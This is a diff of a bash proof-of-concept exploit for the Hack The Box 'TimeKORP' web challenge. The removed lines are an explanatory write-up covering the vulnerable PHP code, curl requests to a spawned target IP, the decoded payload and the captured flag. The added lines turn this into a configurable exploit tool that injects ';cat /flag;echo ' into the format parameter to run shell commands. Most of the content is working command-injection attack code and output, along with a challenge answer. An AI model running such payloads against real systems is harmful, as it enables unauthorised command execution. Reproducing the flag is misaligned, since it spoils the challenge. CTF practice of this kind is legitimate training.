@@ -1,102 +1,196 @@
 #!/usr/bin/env bash
 set -euo pipefail
 
-# Challenge Name: TimeKORP
-# Category: Web
-# Platform: Hack The Box
+# -----------------------------------------------------------------------------
+# PoC: Hack The Box - TimeKORP
+# Type: Command Injection via unsanitized date format parameter
 #
-# Description:
-# The application is a small web page that renders the current time or date
-# based on a `format` query parameter.
-#
-# Provided file:
-# web_timecorp.zip
-#
-# Spawned target used during solving:
-# http://154.57.164.80:31558
-#
-# Core lesson:
-# User input is passed directly into a shell command:
-# date '+<format>' 2>&1
-#
-# That is command injection because the format is wrapped in single quotes.
-# If we supply our own single quote, we can terminate the intended string,
-# execute arbitrary shell commands, and then reopen the quote so the command
-# line remains syntactically valid.
-#
-# Vulnerable code path:
-# models/TimeModel.php
-#
-#   $this->command = "date '+" . $format . "' 2>&1";
-#   $time = exec($this->command);
-#
-# Step 1: Read the source code.
-# Manual command:
-# sed -n '1,220p' challenge/models/TimeModel.php
-#
-# Reason:
-# This reveals the exact shell command construction and explains why normal
-# metacharacters like `;` do not work by themselves until we first break out of
-# the surrounding single-quoted string.
-#
-# Step 2: Confirm the live app uses the format parameter.
-# Manual command:
-# curl -s 'http://154.57.164.80:31558/?format=%25H:%25M:%25S'
-#
-# Reason:
-# The homepage prints the result of the `date` command in the page body.
-# That reflected output becomes our exfiltration channel.
-#
-# Step 3: Break out of the quoted date format and read the flag.
-# Manual command:
-# curl -s 'http://154.57.164.80:31558/?format=%27%3Bcat%20/flag%3Becho%20%27'
-#
-# Decoded payload:
-# ';cat /flag;echo '
-#
-# Why this works:
-# The final shell command becomes roughly:
-# date '+';cat /flag;echo '' 2>&1
-#
-# Which means:
-# - date '+' runs first
-# - cat /flag runs next
-# - echo '' cleans up the trailing quote context
-#
-# The application then captures the last command output and renders it in:
-# "It's <output>."
-#
-# Real-world concept:
-# This is a classic shell injection pattern caused by:
-# - string concatenation into a shell command
-# - assuming quoting alone is enough protection
-#
-# The safe fix is to avoid shell execution entirely and use direct language
-# APIs for time formatting, or at minimum pass arguments safely without invoking
-# a shell.
-#
-# Flag obtained:
-# HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3_a2f2562f0a75125017435e5edf882a5f}
+# This script is intended for authorized CTF infrastructure only.
+# -----------------------------------------------------------------------------
 
-host="${1:-154.57.164.80}"
-port="${2:-31558}"
+readonly SCRIPT_NAME="$(basename "$0")"
+readonly DEFAULT_TIMEOUT=15
+readonly DEFAULT_PAYLOAD="';cat /flag;echo '"
 
-python3 - "$host" "$port" <<'PY'
+HOST=""
+PORT=""
+TIMEOUT="${DEFAULT_TIMEOUT}"
+PAYLOAD="${DEFAULT_PAYLOAD}"
+JSON_OUTPUT=0
+VERBOSE=0
+
+usage() {
+  cat <<EOF
+Usage:
+  ${SCRIPT_NAME} <host> <port>
+  ${SCRIPT_NAME} --host <host> --port <port> [options]
+
+Options:
+  --host <host>         Target host or IP address
+  --port <port>         Target TCP port
+  --payload <value>     Injection payload for format parameter
+  --timeout <seconds>   HTTP timeout in seconds (default: ${DEFAULT_TIMEOUT})
+  --json                Print result as JSON
+  --verbose             Enable verbose debug output
+  -h, --help            Show this help message
+
+Exit codes:
+  0  Success (flag extracted)
+  1  Generic failure
+  2  Invalid arguments
+  3  Connectivity/request failure
+  4  Flag not found in response
+EOF
+}
+
+log_info() {
+  if [[ "${JSON_OUTPUT}" -eq 0 ]]; then
+    printf '[*] %s\n' "$*" >&2
+  fi
+}
+
+log_debug() {
+  if [[ "${VERBOSE}" -eq 1 && "${JSON_OUTPUT}" -eq 0 ]]; then
+    printf '[D] %s\n' "$*" >&2
+  fi
+}
+
+log_ok() {
+  if [[ "${JSON_OUTPUT}" -eq 0 ]]; then
+    printf '[+] %s\n' "$*" >&2
+  fi
+}
+
+log_error() {
+  printf '[-] %s\n' "$*" >&2
+}
+
+parse_args() {
+  local positional=()
+  while [[ $# -gt 0 ]]; do
+    case "$1" in
+      --host)
+        HOST="${2:-}"
+        shift 2
+        ;;
+      --port)
+        PORT="${2:-}"
+        shift 2
+        ;;
+      --payload)
+        PAYLOAD="${2:-}"
+        shift 2
+        ;;
+      --timeout)
+        TIMEOUT="${2:-}"
+        shift 2
+        ;;
+      --json)
+        JSON_OUTPUT=1
+        shift
+        ;;
+      --verbose)
+        VERBOSE=1
+        shift
+        ;;
+      -h|--help)
+        usage
+        exit 0
+        ;;
+      -*)
+        log_error "Unknown option: $1"
+        usage >&2
+        exit 2
+        ;;
+      *)
+        positional+=("$1")
+        shift
+        ;;
+    esac
+  done
+
+  if [[ -z "${HOST}" && ${#positional[@]} -ge 1 ]]; then
+    HOST="${positional[0]}"
+  fi
+  if [[ -z "${PORT}" && ${#positional[@]} -ge 2 ]]; then
+    PORT="${positional[1]}"
+  fi
+
+  if [[ -z "${HOST}" || -z "${PORT}" ]]; then
+    log_error "Host and port are required."
+    usage >&2
+    exit 2
+  fi
+}
+
+validate_input() {
+  if ! [[ "${PORT}" =~ ^[0-9]+$ ]] || (( PORT < 1 || PORT > 65535 )); then
+    log_error "Invalid port: ${PORT}"
+    exit 2
+  fi
+}
+
+main() {
+  parse_args "$@"
+  validate_input
+
+  log_info "Target: http://${HOST}:${PORT}/"
+  log_info "Sending format injection payload..."
+
+  local result
+  if ! result="$(python3 - "${HOST}" "${PORT}" "${PAYLOAD}" "${TIMEOUT}" "${VERBOSE}" <<'PY'
 import re
 import sys
-
 import requests
 
 host = sys.argv[1]
 port = sys.argv[2]
+payload = sys.argv[3]
+timeout = float(sys.argv[4])
+verbose = sys.argv[5] == "1"
 base = f"http://{host}:{port}/"
 
-payload = "';cat /flag;echo '"
-r = requests.get(base, params={"format": payload}, timeout=15)
+try:
+    r = requests.get(base, params={"format": payload}, timeout=timeout)
+except requests.RequestException as exc:
+    print(f"ERR_REQUEST:{exc}")
+    raise SystemExit(3)
+
+if verbose:
+    print(f"DBG_STATUS:{r.status_code}")
+    print(f"DBG_URL:{r.url}")
 
 match = re.search(r"HTB\{[^}]+\}", r.text)
 if not match:
-    raise SystemExit(r.text)
+    print("ERR_NOFLAG:Flag not found in response")
+    if verbose:
+        print(r.text[:1200])
+    raise SystemExit(4)
 
-print(match.group(0))
+print(f"OK_FLAG:{match.group(0)}")
 PY
+)"; then
+    case "$?" in
+      3) log_error "Request/connectivity failure."; exit 3 ;;
+      4) log_error "Flag not found in response."; exit 4 ;;
+      *) log_error "Unexpected runtime failure."; exit 1 ;;
+    esac
+  fi
+
+  log_debug "Exploit output: ${result}"
+  local flag
+  flag="$(printf '%s\n' "${result}" | sed -n 's/^OK_FLAG://p' | tail -n 1)"
+  if [[ -z "${flag}" ]]; then
+    log_error "No flag extracted from output."
+    exit 4
+  fi
+
+  if [[ "${JSON_OUTPUT}" -eq 1 ]]; then
+    printf '{"target":"http://%s:%s/","payload":"%s","flag":"%s"}\n' "${HOST}" "${PORT}" "${PAYLOAD}" "${flag}"
+  else
+    log_ok "Flag extracted successfully."
+    printf '%s\n' "${flag}"
+  fi
+}
+
+main "$@"
